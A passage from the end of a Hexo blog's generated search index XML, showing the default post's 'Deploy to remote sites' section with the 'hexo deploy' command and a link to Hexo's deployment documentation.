sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
